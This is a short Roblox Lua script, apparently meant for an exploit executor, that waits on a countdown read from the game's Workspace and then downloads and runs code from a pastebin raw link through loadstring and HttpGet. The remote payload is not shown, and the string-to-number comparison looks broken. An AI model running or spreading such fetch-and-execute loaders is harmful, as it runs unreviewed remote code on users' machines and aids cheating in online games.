repeat wait() until game:IsLoaded()

local message = game:GetService("Workspace").Message.Text
local number = message:match("%d+")

if number < getgenv().MaxTime then
    wait(number + getgenv().PayoutDelay)
end

loadstring(game:HttpGet("https://pastebin.com/raw/qc2SwaaA"))()
